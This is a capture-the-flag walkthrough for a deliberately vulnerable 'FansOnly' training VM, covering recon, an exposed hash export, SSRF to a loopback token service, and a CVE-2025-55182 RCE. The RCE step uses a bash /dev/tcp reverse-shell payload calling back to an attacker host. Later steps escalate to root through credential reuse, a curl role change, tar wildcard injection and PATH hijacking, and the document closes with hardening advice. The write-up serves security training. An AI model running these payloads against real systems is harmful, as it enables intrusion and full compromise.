# 🚩 FansOnly: CTF Walkthrough & Security Audit

Welcome to the **FansOnly** CTF. This document provides a complete "Red Team" walkthrough of the vulnerabilities discovered in the FansOnly storefront training environment.

This guide only applies to the FansOnly training VM built from this repo. It is not a guide for attacking real systems. Assume the VM has been freshly reset with `sudo bash reset-state.sh` before you start.

---

## 🏗️ Scenario Overview

FansOnly is migrating its legacy systems to a modern Next.js stack. However, segments of the old infrastructure remain active for "compatibility," leaving behind critical security holes. Your objective is to achieve **Full System Compromise (Root Access)**.

### 🎯 Targets
- **Public Entrypoint**: `http://<vm_ip>/`
- **Internal Services**:
    - `127.0.0.1:4000` (Admin API)
    - `127.0.0.1:9000` (Bootstrap Service)

---

## 🔍 Phase 1: Reconnaissance

Before attacking, we must map the attack surface.

### 1. Check `robots.txt`
Navigation to `/robots.txt` reveals hidden directories:
```text
Disallow: /backup/
Disallow: /admin/
Disallow: /internal/exports/
```

### 2. Information Disclosure in Source Code
Checking the public assets, specifically `http://<vm_ip>/assets/site-notes.js`, reveals a developer oversight:
```javascript
// TODO: remove debug exports at /internal/exports/users.csv
```

---

## 🚪 Phase 2: Initial Access

There are three primary ways into the system.

### Path A: The Leaky Export (IDOR)
1. Navigate to `http://<vm_ip>/internal/exports/users.csv`.
2. **Result**: You download a CSV containing a crackable password hash:
    - **Username**: `devops`
    - **MD5 hash**: `e10adc3949ba59abbe56e057f20f883e`
3. **Flag check**: confirm the CSV `notes` field also contains `flag{initial-access-path-a-idor}` and the hint to crack the hash and SSH as `devops`.
4. **Exploit**: Crack the MD5 hash offline with `john` or `hashcat` using `rockyou.txt` to recover the SSH password `123456`.
5. Use the recovered password to SSH into the box: `ssh devops@<vm_ip>`.
6. **Important**: this opens the FansOnly restricted training shell, not a normal Linux shell.
7. Useful starter commands inside the shell:
   ```bash
   whoami
   pwd
   ls
   cat /etc/cron.d/fansonly-backup
   cat /usr/local/sbin/fansonly-maintenance.sh
   ```

### Path B: The Webhook Auditor (SSRF)
1. Study the documentation at `/docs/webhook`. It mentions that "only loopback targets receive a live fetch."
2. Open the tester at `/tools/webhook-test`.
3. The tester input is blank by default. The docs page lists decoy event types, but the key hint is still that only loopback targets receive a live fetch.
4. Enter the internal bootstrap URL: `http://127.0.0.1:9000/bootstrap`.
5. **Result**: The response leaks an `adminToken`.
6. **Flag check**: confirm the response also includes `trainingFlag: flag{initial-access-path-b-ssrf}` plus the `nextHint` that points to analyst signup and the internal Admin API.
7. **Exploit**: Use this token to sign up for an analyst account at `/account/analyst-signup`.
8. Example analyst account:
   - **Email**: `analyst@fansonly.local`
   - **Password**: `123456`
9. After signup, copy the session token shown on `/account`. You will need it for the admin-promotion step.
10. **Flag check**: confirm the analyst account page shows `flag{initial-access-path-b-analyst}` and a curl example for the analyst-to-admin promotion.

### Path C: Legacy Action Preview (RCE)
1. The homepage banner identifies the tech stack: `react@19.1.0` and `next@15.1.0`.
2. Navigate to `/legacy-preview`. This endpoint is vulnerable to **CVE-2025-55182 (React2Shell)**.
3. **Exploit**: Set up a listener on your Kali machine:
   ```bash
   nc -lvnp 4444
   ```
4. Submit a reverse shell payload in the `Action payload` box. Replace `<LHOST>` with your Kali IP.
    *Note: the simulation now requires a "Flight" protocol segment (starting with `1:`):*
    ```json
    1:{"mode":"preview","action":{"type":"import","payload":"bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'"}}
    ```
5. **Result**: You should receive a connection back on your Kali listener, giving you a shell as `www-data`. Browser-interactive shell access at `/console` remains disabled, so the host-side execution must be observed through your listener.
6. **Flag check**: from the `www-data` shell, inspect the breadcrumb file:
   ```bash
   cat /var/www/fan-store/legacy-preview-rce.txt
   ```
   Confirm it contains `flag{initial-access-path-c-rce}` and the hint to inspect `.env`.
7. **Hint check**: inspect the deployed application environment file:
   ```bash
   cat /var/www/fan-store/.env
   ```
   Confirm the top comments repeat `flag{initial-access-path-c-rce}` and point you to `DEVOPS_SSH_PASSWORD`.

---

## 📈 Phase 3: Lateral Movement & Escalation

### Horizontal Escalation 1: `www-data` to `devops`
This path begins after Path C gives you a host-side shell as `www-data`.
1. From the reverse shell, inspect the application environment file:
   ```bash
   cat /var/www/fan-store/.env
   ```
2. **Result**: The file reveals a reused SSH credential:
   - `DEVOPS_SSH_PASSWORD=123456`
3. **Exploit**: Reuse that password to SSH into the target as `devops` from your Kali machine:
   ```bash
   ssh devops@<vm_ip>
   ```
4. Enter the leaked password:
   ```text
   123456
   ```
5. **Result**: You pivot from the compromised web user to the `devops` account and land in the FansOnly restricted training shell.
6. **Flag check**: inspect the horizontal-escalation marker:
   ```bash
   cat /home/devops/flag-horizontal-1.txt
   ```
   Confirm it contains `flag{horizontal-escalation-1-devops}`.
7. **Next-step hints**: inspect the breadcrumb notes now available in the `devops` home directory:
   ```bash
   cat /home/devops/note-1.txt
   cat /home/devops/note-2.txt
   ```
   `note-1.txt` points to the analyst-to-admin path, and `note-2.txt` points to the wildcard `tar` root path.

### Horizontal Escalation 2: Analyst to Admin
Once you have an analyst account and a session token (found on the `/account` page):
1. On a freshly reset VM, the new analyst account is user ID `2`.
2. Use a host-level context (like the `devops` SSH shell) to hit the internal Admin API.
3. **Exploit**:
    ```bash
    curl -X POST http://127.0.0.1:4000/users/2/role \
      -H 'Authorization: Bearer <SESSION_TOKEN>' \
      -d '{"role":"admin"}'
    ```
4. **Result**: Your account is promoted to **Admin**.
5. Refresh `/account` to verify that the role now reads `admin`.
6. **Flag check**: confirm the account page banner shows `flag{horizontal-escalation-2-analyst-to-admin}`.
7. Open the admin-only **DB Credentials** tab.
8. **Flag check**: confirm the tab shows `flag{horizontal-escalation-2-admin-web}`.
9. **Next-step hint**: confirm the tab also points you to `/usr/local/sbin/fansonly-maintenance.sh` and the `PATH`-hijack root path.

### Vertical: Escalating to Root
From the `devops` SSH shell, there are two ways to get root. 

> [!IMPORTANT]
> **Exploit Persistence**: In this training environment, once a session is escalated to `root`, it stays as root for that session. If you have already run an exploit once and wish to practice it again from a "non-root" state, you must ask the Blue Team to run `sudo bash reset-state.sh` on the VM.

#### 1. Wildcard Injection (tar)
The system runs a backup script using `tar *`.
```bash
cd /srv/fan-backups/staging
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
whoami
cat /root/root.txt
cat /root/flag-vertical-1.txt
```
When the cron job runs, it executes `shell.sh` as root.
Check that the shell prints `flag{vertical-escalation-1-tar}` when the escalation completes. Then confirm `/root/root.txt` and `/root/flag-vertical-1.txt` both point you toward the remaining PATH-hijack route.

#### 2. PATH Hijacking
The file `/usr/local/sbin/fansonly-maintenance.sh` uses relative paths for binaries.
```bash
printf '#!/bin/sh\necho owned\n' > /home/devops/.local/bin/du
chmod +x /home/devops/.local/bin/du
id
cat /root/root.txt
cat /root/flag-vertical-2.txt
```
Since `/home/devops/.local/bin` is first in the script's `PATH`, it executes your malicious `du` as root.
Check that the shell prints `flag{vertical-escalation-2-path}` when the escalation completes. Then confirm `/root/root.txt` and `/root/flag-vertical-2.txt` both point you back toward the wildcard `tar` route.

---

## 🏆 Flag Summary

| Milestone | Flag | Where To Check |
| :--- | :--- | :--- |
| **Initial Access A** | `flag{initial-access-path-a-idor}` | `/internal/exports/users.csv` |
| **Initial Access B** | `flag{initial-access-path-b-ssrf}` | webhook tester response for `http://127.0.0.1:9000/bootstrap` |
| **Initial Access B Follow-up** | `flag{initial-access-path-b-analyst}` | analyst `/account` page |
| **Initial Access C** | `flag{initial-access-path-c-rce}` | `/var/www/fan-store/legacy-preview-rce.txt` and comments at top of `/var/www/fan-store/.env` |
| **Horizontal Escalation 1** | `flag{horizontal-escalation-1-devops}` | `/home/devops/flag-horizontal-1.txt` |
| **Horizontal Escalation 2** | `flag{horizontal-escalation-2-analyst-to-admin}` | admin `/account` banner |
| **Horizontal Escalation 2 Web Marker** | `flag{horizontal-escalation-2-admin-web}` | admin `/account` DB Credentials tab |
| **Vertical Escalation 1** | `flag{vertical-escalation-1-tar}` | shell completion message and `/root/flag-vertical-1.txt` |
| **Vertical Escalation 2** | `flag{vertical-escalation-2-path}` | shell completion message and `/root/flag-vertical-2.txt` |
| **Root Marker** | `flag{fansonly-root-compromise-simulated}` | `/root/root.txt` |

---

## 🛡️ Hardening Recommendations
- **Proper IDOR Protection**: Secure the `/internal/exports/` directory behind authentication.
- **SSRF Mitigation**: Implement a whitelist for webhook targets; never allow loopback IPs.
- **Secure Server Actions**: Patch React/Next.js to versions not vulnerable to Flight protocol deserialization issues.
- **Safe Scripting**: Always use absolute paths (e.g., `/usr/bin/tar`) in privileged scripts.
